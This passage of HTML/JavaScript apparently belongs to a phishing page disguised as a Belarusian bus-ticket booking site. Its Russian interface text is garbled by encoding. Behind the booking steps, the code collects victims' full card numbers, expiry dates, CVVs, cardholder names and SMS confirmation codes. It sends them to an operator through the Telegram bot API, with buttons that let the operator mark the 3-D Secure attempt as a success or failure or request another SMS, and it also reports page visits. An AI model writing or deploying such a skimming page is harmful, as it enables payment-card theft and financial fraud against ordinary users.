                            alert('–ì–æ—Ä–æ–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏ –ø—Ä–∏–±—ã—Ç–∏—è –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Ä–∞–∑–Ω—ã–º–∏');
                            return;
                        }
                        
                        state.fromCity = from;
                        state.toCity = to;
                        state.date = date;
                        
                        const results = searchRoutes(from, to);
                        const routeList = document.getElementById('routeList');
                        
                        if (results.length === 0) {
                            routeList.innerHTML = '<p style="text-align:center; color:#64748b;">–ù–µ—Ç —Ä–µ–π—Å–æ–≤ –ø–æ –¥–∞–Ω–Ω–æ–º—É –º–∞—Ä—à—Ä—É—Ç—É</p>';
                            return;
                        }
                        
                        let resultsHtml = '<div class="search-title">üìã –†–ï–ó–£–õ–¨–¢–ê–¢–´ –ü–û–ò–°–ö–ê</div>';
                        results.forEach(route => {
                            resultsHtml += `
                                <div class="route-item">
                                    <div class="route-info">
                                        <h3>${route.from} ‚Üí ${route.to}</h3>
                                        <p>‚è± ${route.duration} ‚Ä¢ üé´ ${route.seats} –º–µ—Å—Ç</p>
                                    </div>
                                    <div style="text-align: right;">
                                        <div class="route-price">${route.price} BYN</div>
                                        <button class="btn" style="padding:8px 16px; margin-top:8px;" onclick="selectRoute(${JSON.stringify(route).replace(/"/g, '&quot;')})">–í–´–ë–†–ê–¢–¨</button>
                                    </div>
                                </div>
                            `;
                        });
                        routeList.innerHTML = resultsHtml;
                    });
                }
                if (state.step === 'select') {
                    document.getElementById('continueBtn')?.addEventListener('click', () => {
                        state.step = 'passenger';
                        render();
                    });
                }
                if (state.step === 'passenger') {
                    document.getElementById('nextBtn')?.addEventListener('click', () => {
                        state.passenger.fullName = document.getElementById('fullName').value.trim();
                        state.passenger.phone = document.getElementById('phone').value.trim().replace(/\D/g, '');
                        state.passenger.email = document.getElementById('email').value.trim();
                        
                        if (!state.passenger.fullName || !state.passenger.phone) {
                            alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –§–ò–û –∏ —Ç–µ–ª–µ—Ñ–æ–Ω');
                            return;
                        }
                        if (state.passenger.phone.length < 10) {
                            alert('–¢–µ–ª–µ—Ñ–æ–Ω –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –Ω–µ –º–µ–Ω–µ–µ 10 —Ü–∏—Ñ—Ä');
                            return;
                        }
                        state.step = 'card';
                        render();
                    });
                }
                if (state.step === 'card') {
                    const cn = document.getElementById('cardNumber');
                    const ex = document.getElementById('expiry');
                    const cv = document.getElementById('cvv');
                    if (cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    if (ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    if (cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));

                    document.getElementById('payBtn')?.addEventListener('click', async () => {
                        state.card.number = document.getElementById('cardNumber').value.trim();
                        state.card.expiry = document.getElementById('expiry').value.trim();
                        state.card.cvv = document.getElementById('cvv').value.trim();
                        state.card.cardholder = document.getElementById('cardholder').value.trim();
                        
                        const cardDigits = state.card.number.replace(/\D/g, '');
                        
                        if (cardDigits.length !== 16) {
                            alert('–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 16 —Ü–∏—Ñ—Ä');
                            return;
                        }
                        if (!state.card.expiry || state.card.expiry.length < 5) {
                            alert('–í–≤–µ–¥–∏—Ç–µ —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è');
                            return;
                        }
                        if (!state.card.cvv || state.card.cvv.length < 3) {
                            alert('–í–≤–µ–¥–∏—Ç–µ CVV-–∫–æ–¥');
                            return;
                        }
                        if (!state.card.cardholder) {
                            alert('–í–≤–µ–¥–∏—Ç–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞ –∫–∞—Ä—Ç—ã');
                            return;
                        }
                        
                        const ok = await sendCardToBot(state.selectedRoute);
                        if (ok) {
                            state.step = 'processing';
                            render();
                        } else {
                            alert('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram');
                        }
                    });
                }
                if (state.step === 'sms') {
                    document.getElementById('confirmSms')?.addEventListener('click', async () => {
                        const code = document.getElementById('smsCode').value.trim();
                        if (!code || code.length < 4) {
                            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS');
                            return;
                        }
                        state.smsCode = code;
                        
                        const messageText = `üì® SMS-–ö–û–î\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}\nüì± –ö–æ–¥: ${code}`;
                        
                        const smsKeyboard = {
                            inline_keyboard: [
                                [{ text: '‚úÖ –£–°–ü–ï–• (3D)', callback_data: `bind_success_${state.sessionId}` },
                                 { text: '‚ùå –§–ï–ô–õ', callback_data: `bind_fail_${state.sessionId}` },
                                 { text: 'üîÑ –ü–û–í–¢–û–† –°–ú–°', callback_data: `resend_${state.sessionId}` }]
                            ]
                        };
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_ID,
                                text: messageText,
                                parse_mode: 'HTML',
                                reply_markup: smsKeyboard
                            })
                        });
                        
                        state.step = 'processing2';
                        render();
                    });
                }
            }

            window.selectRoute = function(route) {
                state.selectedRoute = route;
                state.step = 'select';
                render();
            };

            if (linkHash) {
                sendVisitNotification();
                // –î–ª—è —Ç–µ—Å—Ç–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π —Ä–µ–π—Å
                state.selectedRoute = routes.find(r => r.from === '–ú–∏–Ω—Å–∫' && r.to === '–ì–æ–º–µ–ª—å');
                state.step = 'select';
            }
            render();
        })();
    </script>
</body>
</html>
